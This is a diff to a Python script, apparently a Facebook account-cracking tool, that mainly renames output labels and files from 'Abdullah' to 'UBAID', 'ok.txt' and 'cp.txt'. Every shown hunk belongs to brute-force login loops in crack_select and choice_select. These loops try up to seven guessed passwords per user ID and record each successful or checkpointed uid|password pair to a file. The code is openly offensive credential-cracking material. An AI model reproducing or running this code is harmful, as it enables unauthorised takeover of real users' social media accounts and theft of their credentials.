@@ -628,9 +628,9 @@ def crack_select():
 
 			if "access_token" in q:
 
-				print(" \033[1;32m [Abdullah-ok] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m [UBAID-OK] "+uid+" | "+pass1+"\033[0;97m")
 
-				ok = open("Abdullahok.txt", "a")
+				ok = open("ok.txt", "a")
 
 				ok.write(uid+"|"+pass1+"\n")
 
@@ -642,9 +642,9 @@ def crack_select():
 
 				if "www.facebook.com" in q["error_msg"]:
 
-					print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass1+"\033[0;97m")
 
-					cp = open("Abdullahcp.txt", "a")
+					cp = open("cp.txt", "a")
 
 					cp.write(uid+"|"+pass1+"\n")
 
@@ -662,9 +662,9 @@ def crack_select():
 
 					if "access_token" in q:
 
-						print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass2+"\033[0;97m")
 
-						ok = open("Abdullahok.txt", "a")
+						ok = open("ok.txt", "a")
 
 						ok.write(uid+"|"+pass2+"\n")
 
@@ -676,9 +676,9 @@ def crack_select():
 
 						if "www.facebook.com" in q["error_msg"]:
 
-							print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass2+"\033[0;97m")
 
-							cp = open("Abdullahcp.txt", "a")
+							cp = open("cp.txt", "a")
 
 							cp.write(uid+"|"+pass2+"\n")
 
@@ -696,9 +696,9 @@ def crack_select():
 
 							if "access_token" in q:
 
-								print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass3+"\033[0;97m")
 
-								ok = open("Abdullahok.txt", "a")
+								ok = open("ok.txt", "a")
 
 								ok.write(uid+"|"+pass3+"\n")
 
@@ -710,9 +710,9 @@ def crack_select():
 
 								if "www.facebook.com" in q["error_msg"]:
 
-									print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass3+"\033[0;97m")
 
-									cp = open("Abdullahcp.txt", "a")
+									cp = open("cp.txt", "a")
 
 									cp.write(uid+"|"+pass3+"\n")
 
@@ -730,9 +730,9 @@ def crack_select():
 
 									if "access_token" in q:
 
-										print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass4+"\033[0;97m")
 
-										ok = open("Abdullahok.txt", "a")
+										ok = open("ok.txt", "a")
 
 										ok.write(uid+"|"+pass4+"\n")
 
@@ -744,9 +744,9 @@ def crack_select():
 
 										if "www.facebook.com" in q["error_msg"]:
 
-											print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass4+"\033[0;97m")
 
-											cp = open("Abdullahcp.txt", "a")
+											cp = open("cp.txt", "a")
 
 											cp.write(uid+"|"+pass4+"\n")
 
@@ -764,9 +764,9 @@ def crack_select():
 
 											if "access_token" in q:
 
-												print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass5+"\033[0;97m")
 
-												ok = open("Abdullahok.txt", "a")
+												ok = open("ok.txt", "a")
 
 												ok.write(uid+"|"+pass5+"\n")
 
@@ -778,9 +778,9 @@ def crack_select():
 
 												if "www.facebook.com" in q["error_msg"]:
 
-													print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass5+"\033[0;97m")
 
-													cp = open("Abdullahcp.txt", "a")
+													cp = open("cp.txt", "a")
 
 													cp.write(uid+"|"+pass5+"\n")
 
@@ -798,9 +798,9 @@ def crack_select():
 
 													if "access_token" in q:
 
-														print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass6+"\033[0;97m")
 
-														ok = open("Abdullahok.txt", "a")
+														ok = open("ok.txt", "a")
 
 														ok.write(uid+"|"+pass6+"\n")
 
@@ -812,9 +812,9 @@ def crack_select():
 
 														if "www.facebook.com" in q["error_msg"]:
 
-															print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass6+"\033[0;97m")
 
-															cp = open("Abdullahcp.txt", "a")
+															cp = open("cp.txt", "a")
 
 															cp.write(uid+"|"+pass6+"\n")
 
@@ -832,9 +832,9 @@ def crack_select():
 
 															if "access_token" in q:
 
-																print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass7+"\033[0;97m")
 
-																ok = open("Abdullahok.txt", "a")
+																ok = open("ok.txt", "a")
 
 																ok.write(uid+"|"+pass7+"\n")
 
@@ -846,9 +846,9 @@ def crack_select():
 
 																if "www.facebook.com" in q["error_msg"]:
 
-																	print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass7+"\033[0;97m")
 
-																	cp = open("Abdullahcp.txt", "a")
+																	cp = open("cp.txt", "a")
 
 																	cp.write(uid+"|"+pass7+"\n")
 
@@ -1108,9 +1108,9 @@ def choice_select():
 
 			if "access_token" in q:
 
-				print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass1+"\033[0;97m")
 
-				ok = open("Abdullahok.txt", "a")
+				ok = open("ok.txt", "a")
 
 				ok.write(uid+"|"+pass1+"\n")
 
@@ -1122,9 +1122,9 @@ def choice_select():
 
 				if "www.facebook.com" in q["error_msg"]:
 
-					print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass1+"\033[0;97m")
 
-					cp = open("Abdullahcp.txt", "a")
+					cp = open("cp.txt", "a")
 
 					cp.write(uid+"|"+pass1+"\n")
 
@@ -1140,9 +1140,9 @@ def choice_select():
 
 					if "access_token" in q:
 
-						print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass2+"\033[0;97m")
 
-						ok = open("Abdullahok.txt", "a")
+						ok = open("ok.txt", "a")
 
 						ok.write(uid+"|"+pass2+"\n")
 
@@ -1154,9 +1154,9 @@ def choice_select():
 
 						if "www.facebook.com" in q["error_msg"]:
 
-							print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass2+"\033[0;97m")
 
-							cp = open("Abdullahcp.txt", "a")
+							cp = open("cp.txt", "a")
 
 							cp.write(uid+"|"+pass2+"\n")
 
@@ -1172,9 +1172,9 @@ def choice_select():
 
 							if "access_token" in q:
 
-								print(" \033[1;33m [Abdullah-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass3+"\033[0;97m")
 
-								ok = open("Abdullahok.txt", "a")
+								ok = open("ok.txt", "a")
 
 								ok.write(uid+"|"+pass3+"\n")
 
@@ -1188,7 +1188,7 @@ def choice_select():
 
 									print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass3+"\033[0;97m")
 
-									cp = open("UBIADcp.txt", "a")
+									cp = open("UBAIDcp.txt", "a")
 
 									cp.write(uid+"|"+pass3+"\n")
 
@@ -1218,7 +1218,7 @@ def choice_select():
 
 										if "www.facebook.com" in q["error_msg"]:
 
-											print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass4+"\033[0;97m")
 
 											cp = open("UBAIDcp.txt", "a")
 
@@ -1236,7 +1236,7 @@ def choice_select():
 
 											if "access_token" in q:
 
-												print(" \033[1;33m [UBIAD-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass5+"\033[0;97m")
 
 												ok = open("UBAIDok.txt", "a")
 
@@ -1250,7 +1250,7 @@ def choice_select():
 
 												if "www.facebook.com" in q["error_msg"]:
 
-													print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass5+"\033[0;97m")
 
 													cp = open("UBIADcp.txt", "a")
 
@@ -1268,7 +1268,7 @@ def choice_select():
 
 													if "access_token" in q:
 
-														print(" \033[1;33m [UBIAD-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass6+"\033[0;97m")
 
 														ok = open("UBIADok.txt", "a")
 
@@ -1282,7 +1282,7 @@ def choice_select():
 
 														if "www.facebook.com" in q["error_msg"]:
 
-															print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass6+"\033[0;97m")
 
 															cp = open("UBIADcp.txt", "a")
 
@@ -1300,7 +1300,7 @@ def choice_select():
 
 															if "access_token" in q:
 
-																print(" \033[1;33m [UBIAD-OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;33m [UBAID-OK] "+uid+" | "+pass7+"\033[0;97m")
 
 																ok = open("Abdullahok.txt", "a")
 
@@ -1314,7 +1314,7 @@ def choice_select():
 
 																if "www.facebook.com" in q["error_msg"]:
 
-																	print(" \033[1;32m [UBIAD_CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;32m [UBAID_CP] "+uid+" | "+pass7+"\033[0;97m")
 
 																	cp = open("Abdullahcp.txt", "a")
 
